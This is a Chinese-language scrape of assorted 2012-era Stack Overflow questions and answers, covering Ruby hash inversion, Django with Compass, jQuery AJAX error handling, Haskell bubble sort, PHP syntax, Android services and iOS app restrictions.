NSString *postString = [NSString stringWithFormat:@"facebookFriendTokens=%@&eventDate=%@&placesTokens=%@&name=%@", encodedFriendTokens, encodedDateString, placesQueryStringParm, encodedNameString];
[encodedNameString release];
[encodedDateString release];
[encodedFriendTokens release];
[request setHTTPBody:[postString dataUsingEncoding:NSUTF8StringEncoding]];
NSOperationQueue *queue = [[NSOperationQueue alloc] init];
[NSURLConnection sendAsynchronousRequest:request queue: ... 
```

如果我将 request.getInputStream() 处理为字符串并打印它，它会按预期显示。我应该那样解析字符串吗？

另外，我确实有一个 servlet 过滤器，这可能会修改请求吗？

我想知道服务器是否正在发出重定向，因此我在后续请求中丢失了所有正文数据。我现在正在本地测试这个。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:27:43.500

我相信 GAE servlet 实现会因为您`access_token`在正文中同时具有 Url 参数 ( ) 和表单参数这一事实而感到困惑。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-24T13:21:34.843

问题最终是 GAE AppSpot 服务器在向 http 而不是 https 发出请求时正在执行的幽灵/隐藏重定向。由于我没有在重定向时手动处理创建/修改新请求，因此 body 和 post 参数丢失了，因此服务器永远无法检索到。

只需在客户端上将 url 从 http 更改为 https 即可解决问题。

# django - 带有多个应用程序的 Django 和指南针

> ID：10989249
> 
> 赞同：6
> 
> 时间：2012-06-12T00:42:46.700
> 
> 标签：django, sass, compass-sass, django-compressor

我想使用[Compass](http://compass-style.org)来简化在我的 Django 应用程序中编写 CSS 的任务。但我不知道如何配置它。

我看到 django-compressor 支持 SASS，但是为了使用 Compass，我需要将`_*.scss`文件转储到我的工作区（Django 1.4），因为这是 django-compressor 运行`scss`命令时的工作目录。

[Eric Meyer 的方法](http://compass-style.org/blog/2011/05/09/compass-django/)听起来很明智（在开发期间编译`.scss`文件`.css`并提交给 SCM），但我如何使用 SASS/Compass 工具`.scss`在 Django 工作区中的多个应用程序（可重用和不可重用）中编译并不明显。

我将每个应用程序的静态样式表文件存储在`<app>/static/<app>/css/`.

我遇到的问题是这样的：

1.  `@import`不适用于跨应用程序
2.  将`_*.scss`文件放入工作区是不可接受的
3.  `compass watch`在工作区中运行失败：

    没有什么可编译的。如果你试图开始一个新项目，你已经离开了目录参数。

4.  使用`@include background(...)`失败：

    语法错误：未定义操作：“-compass-list-size(compact(#cccccc, false, false, false, false, false, false, false, false, false)) gt 1"

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-11-06T20:05:32.790

我发现从本质上将 Django 与 Sass 分开要容易得多。您仍然可以同时使用它们，但可能需要另一个终端窗口左右。最后，无论如何，这都是关于为已编译的资产提供服务。

我通常使用根目录中的 /src/ 目录来配置我的项目，这是我放置 Sass 文件的地方。我还在那个根目录中建立了一个 Compass 项目，编译后的样式表进入 /static/css/。

显然，如果您在项目中有很多应用程序，这可能会成为问题，因为您想在根目录 /static/ 中创建应用程序目录或在 / 中创建另一个 Compass 项目

通常，我使用 Grunt 来编译我的 Sass/Compass 文件，所以它有点复杂，虽然很容易重新创建。

Frank Wiles 的帖子[Ultimate Front End Development Setup](http://www.revsys.com/blog/2014/oct/21/ultimate-front-end-development-setup/)与我设置项目的方式非常接近，尽管我跳过使用 django-compressor 因为我觉得不需要添加中间件，而且显然我使用 Grunt 而不是 Gulp。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-19T08:39:39.380

Perhaps you can use a tool like [Fabric](http://docs.fabfile.org/) (or even a bash script) to deal with the compilation and placement of files. As for the `compass watch` command, you might need to manually provide additional parameters for the location of the `.scss` and `.css` files in order for it to `watch` successfully (check the help docs by running `compass help watch`).

# javascript - document.getElementById("myId").InnerHTML 找不到

> ID：10989253
> 
> 赞同：0
> 
> 时间：2012-06-12T00:44:27.310
> 
> 标签：javascript, ajax

我在一些 JavaScript 代码中遇到了这个问题。我在下面的错误中简化了它，因为我已经能够通过调试来查明问题。

HTML：

```
<select id="city_list_select" name="city">
    <div id="clist">
        <option>Select a Region First</option>
    </div>
</select> 
```

JavaScript：

```
document.getElementById("clist").innerHTML = "<option>Test</option>"; 
```

我收到此错误：TypeError：无法将属性“innerHTML”设置为空。所以似乎 JavaScript 在那里找不到那个 div。我能够通过删除 div 并将 JS 更改为 getElementById("city_list_select") 来解决这个问题，但我仍然想弄清楚为什么 div 不能工作，以防我将来遇到类似的问题.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T00:48:53.690

嗯...我认为您不能在 SELECT 标记中包含 DIV 标记。尝试使用 OPTION 标记，或者如您所见，使用 SELECT 标记的 innerHTML 替换所有 OPTION 标记。

```
<select id="city_list_select" name="city">            
  <option id="option1">Select a Region First</option>     
</select> 
```

并且不要忘记您还可以使用诸如`appendChild`将新元素附加到现有元素的方法。

# ruby-on-rails-3 - Rails 3 观察者并将变量传递给方法

> ID：10989254
> 
> 赞同：0
> 
> 时间：2012-06-12T00:44:40.680
> 
> 标签：ruby-on-rails-3, observers

我正在将 MailChimp API 集成到我的应用程序中，并使用 a`UserObserver`将用户添加到 上的 MailChimp 列表中`after_create`，但尝试更新用户时遇到了一点问题。

我允许用户更新他们在系统中的电子邮件地址，这在 MailChimp 列表中会有所不同，我如何将原始电子邮件地址传递给`before_update`回调？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T01:05:18.843

这就是我最终做到的方式。

我`attr_accessor`在我的`UserModel`

```
attr_accessor :current_email
attr_accessible :current_email 
```

然后在我的帐户更新表单中，我使用 current_email 设置了一个隐藏表单字段

```
<%= f.hidden_field :current_email, :value => current_user.email %> 
```

在我的`UserObserver`我可以访问 current_user 并传递回用户对象。

```
 def after_update(user)
    ap user.current_email
  end 
```

希望这对其他人有帮助

# ruby - 如何交换散列中的键和值

> ID：10989259
> 
> 赞同：172
> 
> 时间：2012-06-12T00:46:15.360
> 
> 标签：ruby, hashmap

如何交换哈希中的键和值？

我有以下哈希：

```
{:a=>:one, :b=>:two, :c=>:three} 
```

我想变成：

```
{:one=>:a, :two=>:b, :three=>:c} 
```

使用`map`似乎相当乏味。有更短的解决方案吗？

* * *

## 回答 #1

> 赞同：310
> 
> 时间：2012-06-12T01:08:53.967

Ruby 有一个用于 Hash 的辅助方法，可以让您将 Hash 视为反转（本质上，通过让您通过值访问键）：

```
{a: 1, b: 2, c: 3}.key(1)
=> :a 
```

如果要保留倒置哈希，则[Hash#invert](http://www.ruby-doc.org/core-1.9.3/Hash.html#method-i-invert)应该适用于大多数情况：

```
{a: 1, b: 2, c: 3}.invert
=> {1=>:a, 2=>:b, 3=>:c} 
```

**但...**

如果您有重复的值，`invert`将丢弃除最后一次出现的值之外的所有值（因为它将在迭代期间不断替换该键的新值）。同样，`key`只会返回第一个匹配项：

```
{a: 1, b: 2, c: 2}.key(2)
=> :b

{a: 1, b: 2, c: 2}.invert
=> {1=>:a, 2=>:c} 
```

所以，如果你的价值观是独一无二的，你可以使用`Hash#invert`. 如果没有，那么您可以将所有值保存为数组，如下所示：

```
class Hash
  # like invert but not lossy
  # {"one"=>1,"two"=>2, "1"=>1, "2"=>2}.inverse => {1=>["one", "1"], 2=>["two", "2"]} 
  def safe_invert
    each_with_object({}) do |(key,value),out| 
      out[value] ||= []
      out[value] << key
    end
  end
end 
```

注意：这个带有测试的代码现在[在 GitHub 上](http://gist.github.com/2913760)。

或者：

```
class Hash
  def safe_invert
    self.each_with_object({}){|(k,v),o|(o[v]||=[])<<k}
  end
end 
```

* * *

## 回答 #2

> 赞同：65
> 
> 时间：2012-06-12T00:46:16.170

你敢打赌有一个！在 Ruby 中做事总是有更短的方法！

这很简单，只需使用[`Hash#invert`](http://www.ruby-doc.org/core-1.9.3/Hash.html#method-i-invert)：

```
{a: :one, b: :two, c: :three}.invert
=> {:one=>:a, :two=>:b, :three=>:c} 
```

瞧！

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2017-03-21T03:39:34.377

```
files = {
  'Input.txt' => 'Randy',
  'Code.py' => 'Stan',
  'Output.txt' => 'Randy'
}

h = Hash.new{|h,k| h[k] = []} # Create hash that defaults unknown keys to empty an empty list
files.map {|k,v| h[v]<< k} #append each key to the list at a known value
puts h 
```

这也将处理重复的值。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-07-19T22:23:15.780

如果您有一个哈希值，其中的键是唯一的，您可以使用[Hash#invert](https://docs.ruby-lang.org/en/2.4.0/Hash.html#method-i-invert)：

```
> {a: 1, b: 2, c: 3}.invert
=> {1=>:a, 2=>:b, 3=>:c} 
```

如果你有非唯一的键，那将不起作用，但是，只有最后看到的键将被保留：

```
> {a: 1, b: 2, c: 3, d: 3, e: 2, f: 1}.invert
=> {1=>:f, 2=>:e, 3=>:d} 
```

如果你有一个非唯一键的散列，你可以这样做：

```
> hash={a: 1, b: 2, c: 3, d: 3, e: 2, f: 1}
> hash.each_with_object(Hash.new { |h,k| h[k]=[] }) {|(k,v), h| 
            h[v] << k
            }     
=> {1=>[:a, :f], 2=>[:b, :e], 3=>[:c, :d]} 
```

如果散列的值已经是数组，你可以这样做：

```
> hash={ "A" => [14, 15, 16], "B" => [17, 15], "C" => [35, 15] }
> hash.each_with_object(Hash.new { |h,k| h[k]=[] }) {|(k,v), h| 
            v.map {|t| h[t] << k}
            }   
=> {14=>["A"], 15=>["A", "B", "C"], 16=>["A"], 17=>["B"], 35=>["C"]} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-04-14T11:12:50.453

```
# this doesn't looks quite as elegant as the other solutions here,
# but if you call inverse twice, it will preserve the elements of the original hash

# true inversion of Ruby Hash / preserves all elements in original hash
# e.g. hash.inverse.inverse ~ h

class Hash

  def inverse
    i = Hash.new
    self.each_pair{ |k,v|
      if (v.class == Array)
        v.each{ |x|
          i[x] = i.has_key?(x) ? [k,i[x]].flatten : k
        }
      else
        i[v] = i.has_key?(v) ? [k,i[v]].flatten : k
      end
    }
    return i
  end

end 
```

`Hash#inverse`给你：

```
 h = {a: 1, b: 2, c: 2}
 h.inverse
  => {1=>:a, 2=>[:c, :b]}
 h.inverse.inverse
  => {:a=>1, :c=>2, :b=>2}  # order might not be preserved
 h.inverse.inverse == h
  => true                   # true-ish because order might change 
```

而内置`invert`方法刚刚被破坏：

```
 h.invert
  => {1=>:a, 2=>:c}    # FAIL
 h.invert.invert == h 
  => false             # FAIL 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-09-03T12:56:40.473

使用数组

```
input = {:key1=>"value1", :key2=>"value2", :key3=>"value3", :key4=>"value4", :key5=>"value5"}
output = Hash[input.to_a.map{|m| m.reverse}] 
```

使用哈希

```
input = {:key1=>"value1", :key2=>"value2", :key3=>"value3", :key4=>"value4", :key5=>"value5"}
output = input.invert 
```

# php - 如何以安全的方式处理 Web 应用程序中的 ftp 密码

> ID：10989264
> 
> 赞同：2
> 
> 时间：2012-06-12T00:46:33.660
> 
> 标签：php, mysql, security, passwords

我正在编写一个脚本（PHP+MySQL），它可以让你通过 FTP 编辑文件。我想要做的是当用户登录并连接到服务器时，我想记住 ftp 密码，以便可以重复使用它来透明地重新连接到服务器（例如在浏览文件时）。出于安全原因，我不想将原始密码存储在数据库中。我正在考虑参考数据库中的连接 ID 将密码存储在 cookie 中。但这听起来也不够安全。如何将临时密码条目存储在数据库中？

任何想法如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T00:50:36.330

你可以试试[非对称密钥系统](http://en.wikipedia.org/wiki/Public-key_cryptography)。

1.  生成公共/私人对
2.  将私钥交给用户
3.  使用公钥加密密码并存储在数据库中
4.  每次用户执行操作时，他们都会提供您给他们的私钥
5.  你用私钥解密密码，做动作，然后销毁内存中的私钥

应该比仅仅依靠服务器自己加密/解密更安全。这不是 100% 万无一失的（如果他们根您的服务器，他们可以嗅探私钥），但这是防止单向攻击的好方法。至少，如果您被泄露，任何旧密码都不会受到攻击，因为私钥将会丢失。

**编辑：**正如 sarnold 所指出的，您也可以使用[对称密钥系统](http://en.wikipedia.org/wiki/Symmetric-key_algorithm)来执行此操作。

# jquery - ASP.NET 母版页和可选的 Jquery 脚本

> ID：10989265
> 
> 赞同：1
> 
> 时间：2012-06-12T00:46:38.610
> 
> 标签：jquery, asp.net

我正在使用母版页，并且在某些页面中引用了 JQuery，但不是所有页面。我正在添加一些使用客户端 JQuery 的用户控件，因此需要在使用它们的页面中包含对 jQuery 库的引用。

显然有很多方法可以实现这一点，但我想知道以下技术的相对优缺点的想法（或者是否确实存在更好的技术）：

1.  将脚本元素（通过创建具有相关属性的 HTMLgenericControl）添加到标题 controlCollection - cons -> 如果页面和一些用户控件都使用 jquery，则可以将指向同一文件的多个脚本元素提供给客户端。这真的是劣势吗？浏览器会尝试下载几个副本吗？

2.  添加一个 masterPage 布尔属性 jQueryLib 并仅在尚未添加脚本元素的情况下添加上述脚本元素。缺点 - 在母版页的情况下，我无法在 ASP 中设置属性，因为我可以使用用户控件。因此所有页面都需要更多的代码隐藏而不是简单的 <%@ Page jQueryLib="true">

3.  如果 jQuery==='undefined'，则使用一些相当简单的客户端 javascript 加载 jQuery 并在加载库后运行相关脚本。缺点 - 如果在一个页面上使用多个用户控件，则指向用于执行此操作的 javascript 实用程序函数的脚本标记仍将多次出现在标题中。然而，作为一个优势，这个文件比 jQuery 库小得多。

4.  只需将脚本引用放在母版页中，即使只有以管理员身份登录的用户才需要任何 jquery 功能。

与往常一样 - 非常感谢您的想法，并为我对所有 html 和 asp 的业余知识表示歉意。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:16:19.437

您只能使用以下内容将 jQuery 添加到管理员的 MasterPage：

**服务器端**：

```
protected bool administrator { get { return true; } } 
```

**Javascript**：

```
function pageLoad(sender, args) {
    var administrator = "<%= administrator %>".toLowerCase() == "true" ? true : false;

    if(administrator == true)
        loadJQuery();
}

function loadJQuery(){
    var scriptTag = document.createElement("script");
    var filePath = "jquery.js";

    scriptTag.onload = function( loadEvent ){
        // This function runs when jquery is loaded
    }

    scriptTag.type = "text/javascript";
    scriptTag.src = filePath;
    document.getElementsByTagName("head")[0].appendChild(scriptTag);
} 
```

# crystal-reports - 用前导零填充固定数字，直到固定长度

> ID：10989266
> 
> 赞同：22
> 
> 时间：2012-06-12T00:47:10.257
> 
> 标签：crystal-reports, report, padding, formula, zero

在使用 Visual Studio 2010 的 Crystal Report 中，我正在尝试为以下场景创建一个公式：

x = 任意数字（固定为 8 位数字，不能小于或大于）

如果 X 的长度小于 8，则在前面填充所需数量的 0，使其长度为 8。

例如：

```
X = 123
Result of Formula should be 00000123

X = 9
Result of Formula should be 00000009 
```

任何帮助将不胜感激。提前致谢。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-06-12T11:09:35.993

`ToText({table.field},"00000000")`更简洁。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-06-13T03:10:42.910

我得到了它

```
Right("0000"&{MyFieldToPad},8) 
```

按照我的意愿完美运行。

# list - 实现类似于冒泡排序的排序方法

> ID：10989274
> 
> 赞同：1
> 
> 时间：2012-06-12T00:48:07.153
> 
> 标签：list, sorting, haskell

我试图弄清楚如何实现一种类似于冒泡排序但在某些方面有所不同的排序方法。

伪代码将是这样的：

1.  获取列表并获取列表中的第一个元素
2.  如果它旁边的元素更小，则交换元素
3.  否则将元素标记为已移动并重复直到所有元素都被标记

以下是我对实现这个问题的想法：

```
sortElement [] elm= []
sortElement [x] elm= [x]
sortElement lis@(x:y:xs) elm = 
--first if is to find the element in the list that i want to move
if elm /=x  
then x:sortElement(y:xs) elm 
else if x > y then y:sortElement(x:xs) elm 
else lis

stackBubble lis = stackBubble' lis lis

stackBubble' [] [] = [] 
stackBubble' [x] [] = [x]
stackBubble' [] [x] = []
stackBubble' lis@(x:xs) lis1@(x1:xs1) = do 

sortElement(stackBubble' lis xs1) x1 
```

我得到的错误是

> 函数 stackBubble 中的非详尽模式'

如果我喜欢其他地方的建议：

```
sortElement(x:stackBubble' xs xs1) x1 
```

当我想得到这样的东西时，我会在一次迭代后得到一个完全排序的列表：

```
[4,2,7,1] => iterating 4 [2,4,7,1], after iterating all the elements [2,4,1,7]. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:59:04.433

您收到错误是因为`stackBubble'`当一个参数为空而另一个参数有多个元素时未指定结果。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T02:35:50.447

我开始编写一个更正的版本，但是当我这样做时，问题得到了回答。为了演示起见，无论如何我都会在这里包含它：

```
bubbleSort l =
  bSort l []
  where bSort []        acc = acc
        bSort [x]       acc = acc ++ [x]
        bSort (x:y:xys) acc
          | x > y     = bSort (acc ++ (y:x:xys)) []
          | otherwise = bSort (y:xys) (acc ++ [x]) 
```

请注意，即使按照冒泡排序的标准，这也可能是非常低效的，因为所有列表连接（很可能最好附加到累加器列表的头部，然后在必要时反转）。这种实现非常幼稚，但相当简洁，也许具有启发性，尽管更多的是因为它的粗鲁比任何积极的美德都明显。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T10:56:27.013

解决这个问题的最简单方法可能是使用守卫和简单的递归，例如：

```
bubble :: Ord a => [a] -> [a]
bubble (x:y:xs) | x > y = y : bubble (x : xs)
                | otherwise = x : bubble (y : xs)
bubble x = x 
```

你已经覆盖了警卫吗？以防万一你没有，我会简短地解释一下。守卫的语法是

```
| (expression that evaluates to Bool) = code 
```

就像在模式匹配中一样，Haskell 会从上到下检查守卫并执行第一个返回 true 的守卫。`otherwise`是刚刚定义为的“失败案例” `True`。

所以逐行浏览代码：

```
bubble (x:y:xs) | x > y = y : bubble (x : xs) 
```

我们将列表分成 x:y:xs 并运行第一个守卫，它检查 y 是否小于 x，如果是 y，则将其附加到我们正在构建的结果列表中，然后使用 (x : xs) 再次调用气泡。

```
 | otherwise = x : bubble (y : xs) 
```

第二个守卫总是返回 True，将 x 保持在它的位置并再次调用气泡，列表仍然保持相同的顺序。
最后一行只返回最后一个元素，或者如果您使用空列表调用该函数，则返回一个空列表。

假设示例列表 [4,2,5,1] 执行将如下所示：

```
1: 2 is smaller than 4 -> 2 : bubble [4,5,1]
2: 5 is not smaller than 4 -> 2 : 4 : bubble [5,1]
3: 1 is smaller than 5 -> 2 : 4 : 1 : bubble [5]
4: end of list -> 2 : 4 : 1 : 5 -> [2,4,1,5] 
```

此实现没有明确地将元素“标记”为已移动，但这不是必需的。

# php - jQuery/AJAX：如何确定主机何时离线

> ID：10989280
> 
> 赞同：5
> 
> 时间：2012-06-12T00:48:52.127
> 
> 标签：php, jquery, ajax

我有一个 jQuery 脚本轮询我的服务器以获取新数据，但如果它因任何原因失败，它需要显示错误消息。

这是我的 AJAX 请求：

```
$.ajax({
    url: "query.php", // This just runs some MySQL queries and echos the results
    cache: false,
    error: function() {
       $(".status").text("Server is offline.");
       },
    success: function(html) {
       // Everything went fine, append query results to div
       }
}); 
```

我发现如果重命名 query.php 使其无法访问，则会触发错误函数并显示消息。但是，如果我使 Web 服务器脱机，则不会触发错误功能。

如何调整我的代码以检测主机何时无法访问？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:27:38.887

您应该设置一个低超时，需要注意的是仍然会调用成功，因此您必须检查此时是否有任何数据以知道它是否超时。

```
.ajax({
    url: "query.php", // This just runs some MySQL queries and echos the results
    cache: false,
    timeout: 4000, // 4 seconds
    error: function() {
       $(".status").text("Unable to retrieve data.");
       },
    success: function(html) {
       if (html) {
           // Everything went fine, append query results to div
       }
       else {
           $(".status").text("Server is offline.");
       }
}); 
```

# java - Android 服务基础

> ID：10989282
> 
> 赞同：0
> 
> 时间：2012-06-12T00:48:57.843
> 
> 标签：java, android, service, android-asynctask, intentservice

我是 Android 服务的新手，所以我有一些问题可以阐明如何在我当前的项目中使用它们。

1）我是否需要运行我的应用程序才能运行服务？我是否必须启动应用程序才能启动服务？

2）我想在我的服务运行结束时在屏幕上打印一个文本。首先，是否有可能，其次，当我切换到 Activity 的屏幕时，我能否在 Activity UI 上看到此文本？

3) 我希望我的服务使用在主 Activity 类中实现的变量和函数。是否可以？

4) 与问题 3 相关：我当前的应用程序中有一个 AsyncTask，它使用 TimerTask 每分钟重复一次。我想拥有相同的功能，但这次在用户忙于做其他事情时在后台运行。服务是正确的做法吗？我可以通过从服务中运行我的 searchRegularly()（在 Activity 中）函数来实现吗？下面`backgroundSearch`是每分钟运行的 AsyncTask 的名称。

```
 public void searchRegularly() {

    TimerTask doAsynchronousTask;
    final Handler handler = new Handler();
    searchTimer = new Timer();
    doAsynchronousTask = new TimerTask() {
        @Override
        public void run() {
            // TODO Auto-generated method stub
            handler.post(new Runnable() {
                public void run() { 

                      backgroundSearch = new SearchTask();
                      backgroundSearch.execute();
                }
            });

        }

    };

    searchTimer.schedule(doAsynchronousTask, 1000,60000);

} 
```

5）您如何决定使用Service还是IntentService？主要区别是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T00:56:55.940

1）不。但是应用程序（我的意思是清单中的应用程序类，而不是活动）将在您的服务之前创建

2）你的意思是“[吐司](http://developer.android.com/guide/topics/ui/notifiers/toasts.html)”吗？是的

3）虽然可以通过一些技巧，但不建议这样做。重新考虑您的设计。

4）Service可以做，也可以考虑[AlaramManager](http://developer.android.com/reference/android/app/AlarmManager.html)

5）服务本身应该是一个Singleton，同一个类的两个服务不会同时运行；对于Service，如果调用多个StartService，如果Service已经在运行，则不会启动两次。但是 IntentService 将同时在多个“启动”上工作。

# php - PHP if 在标签之前给出错误 500

> ID：10989283
> 
> 赞同：0
> 
> 时间：2012-06-12T00:49:02.873
> 
> 标签：php, html, if-statement, tags

我正在尝试做一些事情，当您打开 index.php?bodyonly=1 之类的东西时，php 只返回 body html 标记内的内容。但是，当我尝试以下代码时：

```
<?php if !isset($_GET["bodyonly"]): ?><html>
    <head>
        <title>TEST</title>
    </head>

    <body>

        <p>Up!</p>

        <?php endif; ?><p>Down!</p><?php if !isset($_GET["bodyonly"]): ?>
    </body>
</html><?php endif; ?> 
```

我收到错误 500，但没有任何反应。如果我尝试使用 if(isset...){ echo ... } 的替代方法，事情就会发生，但我必须做很多我不想做的其他更改。

愿意开导我吗？:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T01:00:28.453

在所有类型的 PHP 语法中，条件都需要用括号括起来。

```
<?php if (!isset($_GET["bodyonly"])): ?><html>
    <head>
        <title>TEST</title>
    </head>

    <body>

        <p>Up!</p>

        <?php endif; ?><p>Down!</p><?php if (!isset($_GET["bodyonly"])): ?>
    </body>
</html><?php endif; ?> 
```

另外，您是否考虑过为您的代码使用更现代的结构？花括号和将 PHP 作为一种编程语言而不是 HTML 包装器使用使得很容易看到有条件运行的内容。

```
<?php

$status="Up";
// $status="Down";

$header="<html>\n\t<head>\n\t\t<title>TEST</title>\n\t</head>\n\n  <body>\n";
$footer="  </body>\n</html>\n";

if (!isset($_GET["bodyonly"])) {
  print $header;
}

printf("\t<p>%s</p>\n", $status);

if (!isset($_GET["bodyonly"])) {
  print $footer;
} 
```

或者，为了好玩，甚至：

```
<?php

$status="Up";
// $status="Down";

$header="<html>\n\t<head>\n\t\t<title>TEST</title>\n\t</head>\n\n  <body>\n";
$footer="  </body>\n</html>\n";

print isset($_GET["bodyonly"]) ? "" : $header;

printf("\t<p>%s</p>\n", $status);

print isset($_GET["bodyonly"]) ? "" : $footer; 
```

或者（这只是变得愚蠢）：

```
<?php

$status="Up";
// $status="Down";

$header=""; $footer="";

if (!isset($_GET["bodyonly"])) {
  $header="<html>\n\t<head>\n\t\t<title>TEST</title>\n\t</head>\n\n  <body>\n";
  $footer="  </body>\n</html>\n";
}

print $header . sprintf("\t<p>%s</p>\n", $status) . $footer; 
```

查看php.net[的语法说明。](http://php.net/manual/en/language.basic-syntax.php)

# servlets - 如何发布到对话范围 bean 或从 servlet 访问此 bean

> ID：10989286
> 
> 赞同：0
> 
> 时间：2012-06-12T00:49:15.630
> 
> 标签：servlets, ejb, conversation-scope

在场景中，我有一个需要将数据发布到服务器网站的客户端网站。在发布过程中，服务器打开一个登录页面来验证客户端，并在成功验证后将数据存储在数据库中。

我正在使用 javaee6、jsf、ejb。

问题： 1.) 我在 servlet 上发帖，但无法获取对话范围 bean，因此我可以在登录屏幕上显示发布的数据，同时存储在对话范围 bean 中。成功登录后，从 bean 中获取数据并存储在数据库中。

2.) 我可以直接发布到一个页面，带有一个会话范围支持 bean 吗？

3.) 我的一个朋友提到了 jaas，但没有时间好好解释。我可以使用这项技术吗？

谢谢，
czetsuya

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-01-07T03:01:10.440

我想出的解决方案是在托管 bean 的 post 构造方法中读取发布的参数：

```
@PostConstruct
public void init() {
    if (FacesContext.getCurrentInstance() != null) {
        ExternalContext context = FacesContext.getCurrentInstance().getExternalContext();
        Map<String, String> requestParameters = context.getRequestParameterMap();
        if (requestParameters != null) {
            beginConversation();
        }
    }
} 
```

# ios - 我可以限制在 iOS 设备上安装企业应用程序吗？

> ID：10989287
> 
> 赞同：3
> 
> 时间：2012-06-12T00:49:24.490
> 
> 标签：ios, mdm, airwatch

据说 AirWatch 确实允许这样做，但我正在尝试使用配置文件和/或 Apple Configurator 找到解决方案。

我可以限制 iOS 设备安装企业应用程序吗（设备需要 Safari 访问权限，因此理论上可以从 Web 链接下载它）。我认为这可以通过不允许设备安装任何配置文件来实现，但我也找不到限制这一点的方法。

此外，“允许安装应用程序”并不能解决问题......仍然允许您安装企业应用程序。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-03-05T15:20:20.470

Apple 不授予禁止应用程序的权利。您不能阻止用户安装应用程序。但是，您可以阻止访问 AppStore。这样一来，用户就无法安装任何应用程序，即使他们在浏览器或其他地方获得了链接。

如果您仍然希望将企业应用程序安装在设备上，您可以在通过 AppleConfigurator 准备设备时添加它。在“准备”部分中，您有一个默认情况下将安装在设备上的应用程序列表。使用 AirWatch，我只是将“AirWatch MDM Agent”放在此列表中，但您可以添加任何您想要的应用程序。

另一个虽然是您可以将您的设备配置为“单一应用程序”。这意味着设备将从该应用程序开始，并且仅从该应用程序开始。没有办法退出或回家，你只能使用那个应用程序。它可以通过 AppleConfigurator 或 AirWatch 配置文件进行配置（更灵活）。如果您通过 AppleConfigurator 执行此操作，请小心，您的应用程序无法访问其他应用程序，并且您之后正常使用设备的唯一选择是擦除它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-01-21T13:18:25.657

您实际上可以限制在 iOS 设备上安装特定应用程序。您需要使用名为 Apple Configurator 的 Mac 应用程序。您可以创建一个新的配置文件，然后将“限制”配置为不允许特定的应用列表。

设置配置文件也非常方便，因此未经授权无法将其从设备中删除。

为了支持此功能，您安装配置文件的设备必须进入受监督模式。您可以使用 Apple Configurator 执行此操作。它需要擦除设备并将其设置为“新手机”。您无法从备份中恢复，有轻微的缺点，但如果您需要阻止特定应用程序，这是值得的。

# c# - WP7 应用程序无一例外地终止，数据绑定？

> ID：10989292
> 
> 赞同：0
> 
> 时间：2012-06-12T00:50:41.127
> 
> 标签：c#, windows-phone-7, silverlight-4.0

我有一个应用程序，我在启动时制作了多个 HttpRequests。在我尝试将大量 UI 处理转移到不同的类以尝试更像一个 MVVM 应用程序之前，它工作正常。现在，当我用数据加载页面时，我的应用程序崩溃/终止，无一例外。

这个终止的主要来源（我相信）是我为应用程序的 RootFrame 设置 ViewModel 的地方，以便我可以在我的 xaml 绑定中引用它的类。

```
 (App.Current as App).RootFrame.DataContext = (App.Current as App).ViewModel; 
```

没有这个，应用程序将启动，但我的数据都没有绑定到页面。我猜有一些异步 Http 调用正在更改 ViewModel，同时它试图将该 ViewModel 设置为 RootFrame 的数据上下文。我不确定这是否会导致这种终止，但我只是猜测。

我很确定这部分是导致错误的原因，因为在此之后应用程序刚刚关闭，输出如下：

```
 'UI Task' (Managed): Loaded 'mscorlib.dll'
    'UI Task' (Managed): Loaded 'System.Windows.RuntimeHost.dll'
    'UI Task' (Managed): Loaded 'System.dll'
    'UI Task' (Managed): Loaded 'System.Windows.dll'
    'UI Task' (Managed): Loaded 'System.Net.dll'
    'UI Task' (Managed): Loaded 'System.Core.dll'
    'UI Task' (Managed): Loaded 'System.Xml.dll'
    'UI Task' (Managed): Loaded '\Applications\Install\CCB2E631-D1D5-4AB0-B253-7B6CF6367D16\Install\ParkQuest.dll', Symbols loaded.
    'UI Task' (Managed): Loaded 'Microsoft.Phone.dll'
    'UI Task' (Managed): Loaded 'Microsoft.Phone.Interop.dll'
    'UI Task' (Managed): Loaded 'Microsoft.Xna.Framework.dll'
    'UI Task' (Managed): Loaded '\Applications\Install\CCB2E631-D1D5-4AB0-B253-7B6CF6367D16\Install\Facebook.dll'
    'UI Task' (Managed): Loaded '\Applications\Install\CCB2E631-D1D5-4AB0-B253-7B6CF6367D16\Install\System.Windows.Interactivity.dll'
    'UI Task' (Managed): Loaded '\Applications\Install\CCB2E631-D1D5-4AB0-B253-7B6CF6367D16\Install\Microsoft.Expression.Interactions.dll'
    'UI Task' (Managed): Loaded 'System.Runtime.Serialization.dll'
    'UI Task' (Managed): Loaded '\Applications\Install\CCB2E631-D1D5-4AB0-B253-7B6CF6367D16\Install\Microsoft.Phone.Controls.Toolkit.dll'
    The thread '<No Name>' (0x1af811be) has exited with code 0 (0x0).
    The thread '<No Name>' (0x1ada0ebe) has exited with code 0 (0x0).
    The thread '<No Name>' (0x1a9c105a) has exited with code 0 (0x0).
    The program '[457643138] UI Task: Managed' has exited with code 0 (0x0). 
```

仅供参考，我的启动对象不是问题，因为我已经看到某些人是这样。

提前感谢您的有用建议，如果您认为我应该有更好的方法来实现我的数据绑定，请告诉我。

此外，如果您需要任何其他信息来帮助您回答此问题，请不要犹豫。
